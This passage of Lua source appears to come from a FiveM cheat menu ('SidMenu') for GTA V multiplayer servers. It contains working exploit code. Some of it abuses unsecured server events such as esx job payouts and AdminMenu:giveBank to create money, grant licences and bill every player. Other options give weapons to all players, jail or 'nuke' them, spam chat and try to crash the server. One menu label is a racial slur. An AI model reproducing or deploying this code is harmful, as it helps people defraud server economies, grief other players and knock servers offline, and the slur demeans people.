					elseif IsEntityDead(GetPlayerPed(i)) then
						TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end

		elseif SidMenu.Button("~r~All Weapons ~y~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 250, false, false)
					end
				end
			end
				elseif SidMenu.Button("~r~Remove All Weapons ~w~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
		elseif SidMenu.Button('~r~Bottle ~w~All Players') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_plastic_bottle_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_plastic_bottle_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
					elseif SidMenu.Button('~r~Windmill ~w~All Players') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'prop_windmill_01'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'prop_windmill_01'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
					end
	
	elseif
		SidMenu.CheckBox(
		"~y~Chat Spam",
		chatspam,
		function(enabled)
		chatspam = enabled
		end)
	then
	elseif
		SidMenu.CheckBox(
		"~r~Nuke ~w~All Players",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	then
	elseif
		SidMenu.Button(
		"~r~Nuke ~w~Server ~w~economy ~g~ESX",
		esxdestroy,
		function(enabled)
		esxdestroy = enabled
		end)
	then
	elseif
		SidMenu.Button("~r~Nuke Server ~r~2 ~g~ESX") then
		esxdestroyv2()
	elseif
		SidMenu.CheckBox(
		"~r~Jail ~w~All Players",
		jailallusers,
		function(enabled)
		jailallusers = enabled
		end)
	then
	elseif
		SidMenu.CheckBox(
		"~r~Cuff ~w~All Players",
		freezeall,
		function(enabled)
		freezeall = enabled
	   	end)
	then
	elseif
		SidMenu.CheckBox(
			"~r~Try To Crash ~w~Server",
			servercrasher,
			function(enabled)
				servercrasher = enabled
			end)
	then
	end
-- weapon menu
				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("WeaponMenu") then
				if SidMenu.MenuButton("~w~Specific Weapon", "SingleWeaponMenu") then
				elseif SidMenu.Button("~g~Give ~w~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
					end
				elseif SidMenu.Button("~r~Remove ~w~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif SidMenu.Button("~w~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 22)
					end
				
				elseif
					SidMenu.CheckBox(
						"~w~Infinite Ammo",
						InfAmmo,
						function(enabled)
							InfAmmo = enabled
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 SidMenu.CheckBox("~w~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 SidMenu.CheckBox("~y~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("SingleWeaponMenu") then
				for i = 1, #allWeapons do
					if SidMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 42, false, false)
					end
				end

-- boost menu
SidMenu.Display()
		elseif SidMenu.IsMenuOpened("BoostMenu") then
			if SidMenu.MenuButton('Power Boost', 'PowerBoostMenu') then
			elseif SidMenu.MenuButton('Torque Boost', 'TorqueBoostMenu') then
			end
			
			SidMenu.Display()
		elseif SidMenu.IsMenuOpened('PowerBoostMenu') then 
			if SidMenu.Button('Engine Power boost reset') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif SidMenu.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x256') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
			elseif SidMenu.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			end

			SidMenu.Display()
		elseif SidMenu.IsMenuOpened('TorqueBoostMenu') then 
			if SidMenu.CheckBox('Engine Torque boost ~g~x2', Torque2, function(enabled)
				Torque2 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x4', Torque4, function(enabled)
				Torque4 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x8', Torque8, function(enabled)
				Torque8 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x16', Torque16, function(enabled)
				Torque16 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x32', Torque32, function(enabled)
				Torque32 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x64', Torque64, function(enabled)
				Torque64 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x128', Torque128, function(enabled)
				Torque128 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x256', Torque256, function(enabled)
				Torque256 = enabled
			end) then
			elseif SidMenu.CheckBox('Engine Torque boost ~g~x512', Torque512, function(enabled)
				Torque512 = enabled end) then
			end
			
				SidMenu.Display()
		elseif SidMenu.IsMenuOpened("VehicleMenu") then
				if SidMenu.Button("~g~Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end
						
						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~Model is not valid!")
					end
				elseif SidMenu.Button("~w~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)

				elseif SidMenu.Button("~w~Repair Engine Only") then
					local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
					SetVehicleUndriveable(veh,false)
					SetVehicleEngineHealth(veh, 1000.0)
					SetVehiclePetrolTankHealth(veh, 1000.0)
					healthEngineLast=1000.0
					healthPetrolTankLast=1000.0
					SetVehicleEngineOn(veh, true, false )
					SetVehicleOilLevel(veh, 1000.0)
				elseif SidMenu.Button("~w~Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif SidMenu.Button("~w~Max mechanics ~r~only performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif SidMenu.Button('~w~Turbo ~g~ON') then
					ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), true), 18, true)
				elseif SidMenu.Button('~w~Turbo ~r~OFF') then
					ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, false)
				elseif SidMenu.Button("~w~Change car ~b~plate") then CaPl()
				elseif SidMenu.MenuButton('Vehicle ~r~Boost', 'BoostMenu') then
				elseif SidMenu.Button("~g~Buy Vehicle for Free") then
					fv()
				elseif
					SidMenu.CheckBox(
					"~w~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif SidMenu.Button("~w~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif SidMenu.Button("~w~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif SidMenu.Button('~w~Flip Vehicle') then
                    local ax = GetPlayerPed(-1)
					local ay = GetVehiclePedIsIn(ax, true)
					if
						IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
							GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
					 then
						SetVehicleOnGroundProperly(ay)
						drawNotification('~g~Vehicle Flipped!', false)
					else
						drawNotification("~w~You Aren't In The Driverseat Of A Vehicle!", true) end
				elseif SidMenu.Button('~w~shuffle seat') then	
					TriggerEvent("SeatShuffle")
				elseif
					SidMenu.CheckBox(
						"~w~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif
					SidMenu.CheckBox(
						"~w~Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				end
--Lua menu
				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("ServerMenu") then
				if SidMenu.MenuButton("~y~JOBS ~w~Menu ", "CustomOptions") then
				elseif SidMenu.MenuButton("~g~MONEY ~w~Options ", "ESXMoney") then
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				elseif SidMenu.MenuButton("~p~DRUG ~w~Menu ", "ESXDrugs") then
				elseif SidMenu.MenuButton("~o~MISC ~w~Menu ", "ESXMisc") then
				elseif SidMenu.MenuButton("~b~BOSS ~w~Menu ", "ESXBoss") then
				elseif SidMenu.MenuButton("~h~Niggas are white ", "NiggasOptions") then
				end
				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("CustomOptions") then
				if SidMenu.Button("~c~Mechanic Actions ~y~Menu") then	
				OpenMechanicActionsMenu()
			elseif SidMenu.Button("~c~Mechanic Mobile Actions ~y~Menu") then	
				OpenMobileMechanicActionsMenu()
			elseif SidMenu.Button("~r~Ambulance Mobile ~y~Menu") then
				OpenMobileAmbulanceActionsMenu()
			elseif SidMenu.Button("~r~Ambulance Pharmacy ~y~Menu") then
				OpenPharmacyMenu()
			elseif SidMenu.Button("~g~Gang Actions ~y~Menu") then
				OpenGangActionsMenu()
			elseif SidMenu.Button("~b~Police Actions ~y~Menu") then	
				OpenPoliceActionsMenu()
				end
				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("ESXBoss") then
				if SidMenu.Button("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mechanic', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~p~car~w~ dealer") then	
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data2, menu2) menu2.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif SidMenu.Button("~g~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("ESXMoney") then
				if SidMenu.Button("~r~Automatic Money") then
				local result = KeyboardInput("Can be multiplied, watch out", "", 100000000)
				if result then
				TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:payy', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('99kr-burglary:addMoney', result)
				drawNotification("Testing ~g~ESX scripts ~w~look in inventory")
				end
			elseif SidMenu.Button("~w~Money swipe ~g~(2MIL+)") then
				a=7 repeat TriggerServerEvent("pizza:paiefinale")  a=a+1 until (a>7000)
			elseif SidMenu.Button("~w~Money swipe ~g~(500k+)") then
				TriggerServerEvent("esx_godirtyjob:pay", 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
				TriggerServerEvent("esx_banksecurity:pay", 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)        
				TriggerServerEvent("AdminMenu:giveCash", 500000)
				TriggerServerEvent("esx_gopostaljob:pay", 500000)
				TriggerServerEvent("AdminMenu:giveBank", 500000)
				TriggerServerEvent("esx_truckerjob:pay", 500000)
				TriggerServerEvent("esx_carthief:pay", 500000)
				TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_ranger:pay", 500000)
				TriggerServerEvent("esx_truckersjob:pay", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				drawNotification("~g~Swipe was succesfull")
			elseif SidMenu.Button("~w~Taxi ~g~ESX Succes x10.000") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif SidMenu.Button("~w~Money ~b~VRP ~w~swipe ~g~(500k+)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("~g~Swipe was succesfull")
			elseif SidMenu.Button("~w~Money ~b~VRP ~w~Salary ~g~(10x)") then
					a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
					a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
			elseif SidMenu.Button("~g~Money ~w~Caution") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
			end
			elseif SidMenu.Button("~g~Money ~w~Trucker") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
			end
			elseif SidMenu.Button("~g~Money ~w~Bank Admin") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
			end
			elseif SidMenu.Button("~g~Money ~w~Cash Admin") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif SidMenu.Button("~g~Money ~w~Postal") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif SidMenu.Button("~g~Money ~w~Security") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif SidMenu.Button("~g~Money ~w~Slot Machine") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif SidMenu.Button("~g~Money ~w~LSC Garage") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif SidMenu.Button("~g~Money ~w~Vrp") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif SidMenu.Button("~g~Money ~w~Dirty") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif SidMenu.Button("~g~Money ~w~Delivery") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif SidMenu.Button("~g~Money ~w~Taxi") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
					TriggerServerEvent('esx_taxijob:success')
				end
			elseif SidMenu.Button("~g~Money ~w~Pilot") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
					TriggerServerEvent('esx_pilot:success')
			elseif SidMenu.Button("~g~Money ~w~Garbage") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif SidMenu.Button("~w~Bank ~r~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif SidMenu.Button("~w~Bank ~r~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:withdraw", result)
				TriggerServerEvent('bank:withdraw', tonumber(result))
				end
			end

			

			SidMenu.Display()
				elseif SidMenu.IsMenuOpened("ESXMisc") then
				    if SidMenu.Button("~g~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif SidMenu.Button("~g~ESX ~w~Get all licenses ") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
				elseif SidMenu.Button("~w~Retrieve ~b~Bottles") then
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
					TriggerServerEvent("esx-ecobottles:retrieveBottle")
				elseif SidMenu.Button("~w~Sell ~b~Bottles") then	
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
					TriggerServerEvent("esx-ecobottles:sellBottles")
				elseif SidMenu.Button("~w~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "187")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif SidMenu.Button("~w~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				
				end
				

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("MiscServerOptions") then
				if SidMenu.Button("~w~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "187")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif SidMenu.Button("~w~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("VRPOptions") then
				if SidMenu.Button("~r~VRP ~w~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif SidMenu.Button("~r~VRP ~g~WIN ~w~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif SidMenu.Button("~r~VRP ~w~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif SidMenu.Button("~r~VRP ~w~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif SidMenu.Button("~r~VRP ~w~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("ESXDrugs") then
				if SidMenu.Button("~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif SidMenu.Button("~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif SidMenu.Button("~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif SidMenu.Button("~y~Harvest ~y~Orange ~c~(x5)") then
					TriggerServerEvent('esx_farmoranges:startHarvestKoda')
					TriggerServerEvent('esx_farmoranges:startHarvestKoda')
					TriggerServerEvent('esx_farmoranges:startHarvestKoda')
					TriggerServerEvent('esx_farmoranges:startHarvestKoda')
					TriggerServerEvent('esx_farmoranges:startHarvestKoda')
				elseif SidMenu.Button("~y~Transform ~y~Orange ~c~(x5)") then
					TriggerServerEvent('esx_farmoranges:startTransformKoda')
					TriggerServerEvent('esx_farmoranges:startTransformKoda')
					TriggerServerEvent('esx_farmoranges:startTransformKoda')
					TriggerServerEvent('esx_farmoranges:startTransformKoda')
					TriggerServerEvent('esx_farmoranges:startTransformKoda')
				elseif SidMenu.Button("~y~Sell ~y~Orange ~c~(x5)") then
					TriggerServerEvent('esx_farmoranges:startSellKoda')
					TriggerServerEvent('esx_farmoranges:startSellKoda')
					TriggerServerEvent('esx_farmoranges:startSellKoda')
					TriggerServerEvent('esx_farmoranges:startSellKoda')
					TriggerServerEvent('esx_farmoranges:startSellKoda')	
				elseif SidMenu.Button("~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif SidMenu.Button("~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif SidMenu.Button("~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
